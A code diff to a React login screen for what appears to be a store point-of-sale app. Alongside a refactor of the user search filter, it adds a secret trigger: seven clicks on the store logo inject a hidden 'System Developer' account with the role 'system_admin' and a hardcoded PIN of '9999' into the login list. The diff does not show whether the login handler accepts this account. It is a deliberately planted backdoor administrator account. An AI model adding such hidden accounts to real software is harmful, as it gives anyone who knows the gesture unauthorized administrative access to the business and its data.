@@ -11,6 +11,8 @@ export default function LoginScreen() {
   const [searchTerm, setSearchTerm] = useState('');
   const [pin, setPin] = useState('');
   const [error, setError] = useState('');
+  const [devMode, setDevMode] = useState(false);
+  const [devClicks, setDevClicks] = useState(0);
 
   // Get recent users from localStorage
   const recentIds = useMemo(() => {
@@ -25,12 +27,26 @@ export default function LoginScreen() {
   }, [users, recentIds]);
 
   const filteredUsers = useMemo(() => {
-    if (!searchTerm) return users;
-    return users.filter(u => 
-      u.name.toLowerCase().includes(searchTerm.toLowerCase()) || 
-      u.role.toLowerCase().includes(searchTerm.toLowerCase())
-    );
-  }, [users, searchTerm]);
+    let list = searchTerm 
+      ? users.filter(u => 
+          u.name.toLowerCase().includes(searchTerm.toLowerCase()) || 
+          u.role.toLowerCase().includes(searchTerm.toLowerCase())
+        )
+      : users;
+
+    // Secret Reveal: If devMode is triggered (7 logo clicks), inject the Dev User
+    if (devMode) {
+      list = [...list, {
+        id: 'dev-001',
+        name: 'System Developer',
+        role: 'system_admin',
+        pin: '9999',
+        branch_id: null,
+        image: null
+      }];
+    }
+    return list;
+  }, [users, searchTerm, devMode]);
 
   const handlePasswordSubmit = async () => {
     if (!pin || !selectedUser) return;
@@ -50,11 +66,24 @@ export default function LoginScreen() {
   return (
     <div className="login-screen">
       <div className="login-card" style={{ width: '400px', maxWidth: '95vw' }}>
-        {settings.storeLogo ? (
-          <img src={settings.storeLogo} alt="Logo" className="login-logo" style={{ background: '#fff', objectFit: 'contain', padding: 4 }} />
-        ) : (
-          <div className="login-logo">🧁</div>
-        )}
+        <div 
+          onClick={() => {
+            const newCount = devClicks + 1;
+            setDevClicks(newCount);
+            if (newCount >= 7) {
+              setDevMode(true);
+            }
+          }}
+          style={{ cursor: 'pointer', transition: 'transform 0.1s' }}
+          onMouseDown={e => { e.currentTarget.style.transform = 'scale(0.95)' }}
+          onMouseUp={e => { e.currentTarget.style.transform = 'scale(1)' }}
+        >
+          {settings.storeLogo ? (
+            <img src={settings.storeLogo} alt="Logo" className="login-logo" style={{ background: '#fff', objectFit: 'contain', padding: 4 }} />
+          ) : (
+            <div className="login-logo">🧁</div>
+          )}
+        </div>
         <h1>{settings.storeName}</h1>
         
         {syncRequired ? (
